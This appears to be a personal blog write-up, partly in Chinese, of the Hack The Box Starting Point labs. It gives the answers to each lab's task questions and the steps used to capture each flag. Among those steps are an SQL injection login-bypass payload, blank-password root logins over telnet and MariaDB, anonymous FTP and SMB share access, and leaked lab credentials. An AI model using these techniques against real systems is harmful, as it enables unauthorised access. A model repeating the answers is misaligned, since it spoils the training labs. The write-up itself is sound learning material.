---
title: Hack The Box - Starting Point
date: 2022-02-17
tags:
  - htb
category: htb
---

# Hack The Box - Starting Point

## Meow

### Task1

> What does the acronym VM stand for?

Virtual Machine

### Task2

>  What tool do we use to interact with the operating system in order to start our VPN connection?

Terminal

### Task3

> What service do we use to form our VPN connection?

Openvpn

### Task4

>  What is the abreviated name for a tunnel interface in the output of your VPN boot-up sequence output?

Tun

### Task5

> What tool do we use to test our connection to the target?

ping

### Task6

> What is the name of the tool we use to scan the target's ports?

nmap

### Task7

> What service do we identify on port 23/tcp during our scans?

telnet

### Task8

> What username ultimately works with the remote management login prompt for the target?

root

### Flag

telnet连上去

```
Trying 10.129.118.246...
Connected to 10.129.118.246.
Escape character is '^]'.


  █  █         ▐▌     ▄█▄ █          ▄▄▄▄
  █▄▄█ ▀▀█ █▀▀ ▐▌▄▀    █  █▀█ █▀█    █▌▄█ ▄▀▀▄ ▀▄▀
  █  █ █▄█ █▄▄ ▐█▀▄    █  █ █ █▄▄    █▌▄█ ▀▄▄▀ █▀█

Meow login:
```

输入root

然后

```bash
cat flag.txt
```

## Fawn

### Task1

> What does the 3-letter acronym FTP stand for?

file transfer protocol

### Task2

> What communication model does FTP use, architecturally speaking?

client-server model

### Task3

> What is the name of one popular GUI FTP program?

filezilla

### Task4

> Which port is the FTP service active on usually?

21 tcp

### Task5

> What acronym is used for the secure version of FTP?

sftp

### Task6

> What is the command we can use to test our connection to the target?

ping

### Task7

> From your scans, what version is FTP running on the target?

vsFTPd 3.0.3

### Task8

> From your scans, what OS type is running on the target?

unix

### Flag

```bash
lftp 10.129.210.101:21
cat flag.txt
```

## Dancing

### Task1

> What does the 3-letter acronym SMB stand for?

[Server Message Block](https://en.wikipedia.org/wiki/Server_Message_Block)

### Task2

> What port does SMB use to operate at?

445

### Task3

> What network communication model does SMB use, architecturally speaking?

client-server model

### Task4

> What is the service name for port 445 that came up in our nmap scan?

microsoft-ds

### Task5

> What is the tool we use to connect to SMB shares from our Linux distribution?

smbclient

### Task6

> What is the `flag` or `switch` we can use with the SMB tool to `list` the contents of the share?

-L

### Task7

> What is the name of the share we are able to access in the end?

WorkShares

### Task8

> What is the command we can use within the SMB shell to download the files we find?

get

### Flag

nmap扫描结果

```
nmap -A 10.129.87.53
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-16 20:34 CST
Nmap scan report for bogon (10.129.87.53)
Host is up (0.25s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT    STATE SERVICE       VERSION
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2022-02-16T16:35:57
|_  start_date: N/A
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
|_clock-skew: 3h59m57s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 69.90 seconds
```

```
smbclient -L=10.129.87.53

Enter WORKGROUP\y's password:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        WorkShares      Disk
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.87.53 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

smbclient '\\10.129.87.53\WorkShares'
cd James.P
get flag.txt

```

## Appointment

### Task1

> What does the acronym SQL stand for?

Structured Query Language

### Task2

> What is one of the most common type of SQL vulnerabilities?

sql injection

### Task3

> What does PII stand for?

Personally Identifiable Information

### Task4

> What does the OWASP Top 10 list name the classification for this vulnerability?

[**A03:2021-Injection**](https://owasp.org/Top10/A03_2021-Injection/)

### Task5

> What service and version are running on port 80 of the target?

Apache httpd 2.4.38 (Debian)

### Task6

> What is the standard port used for the HTTPS protocol?

443

### Task7

> What is one luck-based method of exploiting login pages?

 brute-forcing

### Task8

> What is a folder called in web-application terminology?

directory

### Task9

> What response code is given for "Not Found" errors?

404

### Task10

> What switch do we use with Gobuster to specify we're looking to discover directories, and not subdomains?

dir

### Task11

> What symbol do we use to comment out parts of the code?

#

### Flag

万能密码

```
' or 1=1#
```

## Sequel

### Task1

> What does the acronym SQL stand for?

Structured Query Language

### Task2

> During our scan, which port running mysql do we find?

3306

### Task3

> What community-developed MySQL version is the target running?

mariadb

### Task4

> What switch do we need to use in order to specify a login username for the MySQL service?

-u

### Task5

> Which username allows us to log into MariaDB without providing a password?

root

### Task6

> What symbol can we use to specify within the query that we want to display eveything inside a table?

*

### Task7

> What symbol do we need to end each query with?

;

### Flag

```bash
mysql -uroot -h
```

```
show databases;
show tables;
select * from config;
```

## Crocodile

### Task1

> What nmap scanning switch employs the use of default scripts during a scan?

-sC

### Task2

> What service version is found to be running on port 21?

vsftpd 3.0.3

### Task3

> What FTP code is returned to us for the "Anonymous FTP login allowed" message?

230

### Task4

> What command can we use to download the files we find on the FTP server?

GET

### Task5

> What is one of the higher-privilege sounding usernames in the list we retrieved?

admin

### Task6

> What version of Apache HTTP Server is running on the target host?

2.4.41

### Task7

> What is the name of a handy web site analysis plug-in we can install in our browser?

Wappalyzer

### Task8

> What switch can we use with gobuster to specify we are looking for specific filetypes?

-x

### Task9

> What file have we found that can provide us a foothold on the target?

login.php

### Flag

ftp找到用户名密码

```
lftp 10.129.1.15:~> ls
-rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
lftp 10.129.1.15:/>
lftp 10.129.1.15:/> cat allowed.userlist
aron
pwnmeow
egotisticalsw
admin
33 bytes transferred in 1 second (26 B/s)
lftp 10.129.1.15:/> cat allowed.userlist.passwd
root
Supersecretpassword1
@BaASD&9032123sADS
rKXM59ESxesUFHAd
62 bytes transferred in 1 second (51 B/s)
lftp 10.129.1.15:/>
```

直接登录，拿到flag

```
admin
rKXM59ESxesUFHAd
```